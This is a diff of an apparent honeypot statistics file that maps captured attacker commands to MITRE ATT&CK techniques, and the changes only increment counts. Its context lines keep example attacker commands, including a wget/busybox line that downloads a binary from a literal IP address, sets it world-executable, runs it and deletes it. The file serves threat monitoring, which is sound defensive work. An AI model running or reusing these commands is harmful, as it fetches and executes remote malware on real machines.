@@ -25,7 +25,7 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 6341,
+      "count": 6351,
       "distinct_ips": 388,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -42,7 +42,7 @@
         "command-and-control"
       ],
       "url": "https://attack.mitre.org/techniques/T1105",
-      "count": 2412,
+      "count": 2422,
       "distinct_ips": 362,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
@@ -183,6 +183,6 @@
       ]
     }
   ],
-  "total_commands": 272865,
-  "matched_commands": 86318
+  "total_commands": 273013,
+  "matched_commands": 86328
 }
